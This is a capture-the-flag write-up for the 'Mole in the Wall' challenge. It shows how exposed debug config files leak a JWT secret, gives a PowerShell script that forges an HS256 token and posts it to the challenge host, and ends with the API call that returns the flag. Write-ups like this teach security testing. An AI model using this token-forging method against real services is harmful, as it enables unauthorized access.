<style> :root { color-scheme: dark; --bg: #020617; --fg: #e5e7eb; --fg-muted: #9ca3af; --accent: #38bdf8; --border-subtle: #1f2937; } /* Base page */ html, body { margin: 0; padding: 0; background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%); color: var(--fg); font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif; } /* GitHub Pages wrappers */ .page-content, .wrapper, article, .post { background: transparent !important; max-width: 960px; margin: 0 auto; padding: 2.5rem 1.5rem 4rem; } /* Headings */ .post h1, .page-content h1, article h1 { font-size: 1.6rem; margin-bottom: 0.6rem; } .post h2, .page-content h2, article h2 { font-size: 1.1rem; margin-top: 1.8rem; margin-bottom: 0.6rem; color: var(--fg-muted); } /* Tables (optional, if you use them) */ table { border-collapse: collapse; width: 100%; font-size: 0.85rem; margin: 0.4rem 0 0.8rem; border-radius: 0.6rem; overflow: hidden; } th, td { padding: 0.5rem 0.75rem; border-bottom: 1px solid var(--border-subtle); background-color: rgba(15, 23, 42, 0.9); } th { text-align: left; font-weight: 500; color: var(--fg-muted); } tbody tr:nth-child(even) td { background-color: rgba(15, 23, 42, 0.75); } tbody tr:last-child td { border-bottom: none; } /* Links */ a { color: var(--accent); } a:hover { text-decoration: none; } /* Code blocks */ pre, code, pre code, .highlight, .highlight pre, .highlight code { background-color: rgba(15, 23, 42, 0.96) !important; color: var(--fg); } pre { border: 1px solid var(--border-subtle); padding: 0.85rem 1rem; border-radius: 0.5rem; overflow-x: auto; font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; } code { padding: 0.1rem 0.25rem; border-radius: 0.25rem; font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; } </style>

# Mole in the Wall - Writeup

## Summary
Found a debug config that exposed JWT requirements and secret. Used those to craft a valid nightguard token, which made `/login` return a ZIP with logs and a Power Automate flow. The log decoded to a string used as the API input, which returned the flag.

## Recon
- Site only had static pages and a staff login.
- Hint pointed to a JSON in debug/config.

## Debug Config Discovery
- `GET /debug/config/security.json` returned required JWT claims:
  - department=security
  - role=nightguard
  - shift=night
  - algorithm=HS256
- `GET /debug/config/.env` returned the JWT secret:
  - `JWT_SECRET=g0ld3n_fr3ddy_w1ll_a1ways_b3_w@tch1ng_y0u`

## JWT Crafting
Create a HS256 JWT with the required claims and the secret, then POST it to `/login` as `token`.

Example (PowerShell):
```powershell
function Base64UrlEncode([byte[]]$bytes) {
  $b64 = [Convert]::ToBase64String($bytes)
  ($b64.TrimEnd('=') -replace '\+','-' -replace '/','_')
}

$headerJson = '{"alg":"HS256","typ":"JWT"}'
$payloadJson = '{"department":"security","role":"nightguard","shift":"night"}'
$headerB64 = Base64UrlEncode([Text.Encoding]::UTF8.GetBytes($headerJson))
$payloadB64 = Base64UrlEncode([Text.Encoding]::UTF8.GetBytes($payloadJson))
$data = "$headerB64.$payloadB64"
$secret = "g0ld3n_fr3ddy_w1ll_a1ways_b3_w@tch1ng_y0u"
$hmac = New-Object Security.Cryptography.HMACSHA256
$hmac.Key = [Text.Encoding]::UTF8.GetBytes($secret)
$sig = Base64UrlEncode($hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($data)))
$token = "$data.$sig"

Invoke-WebRequest -Uri "https://girlypies.ctf.rusec.club/login" -Method POST -Body "token=$token" -OutFile login_response.zip
```

The response is a ZIP archive.

## ZIP Contents and Decoding
- `logs/session.log` contained: `u$bu_qvsqm4_hvz`
- The flow definition shows a decode step: for each char, ASCII-1
- Decoding yields: `t#at^purpl3^guy`

Other helpful files:
- `config/settings.xml` contains the API path: `/api/run-flow`
- Flow definition shows it POSTs `{ "input": "%FinalVar%" }`

## API Call and Flag
Using the public host with the derived input:

```powershell
Invoke-WebRequest -Uri "https://girlypies.ctf.rusec.club/api/run-flow" -Method POST -ContentType "application/json" -Body '{"input":"t#at_purpl3_guy"}'
```

Note: the server accepted the underscore variant (`t#at_purpl3_guy`).

Response:
```
{"result":"RUSEC{m1cro$oft_n3ver_mad3_g00d_aut0m4t1on}"}
```

## Flag
`RUSEC{m1cro$oft_n3ver_mad3_g00d_aut0m4t1on}`
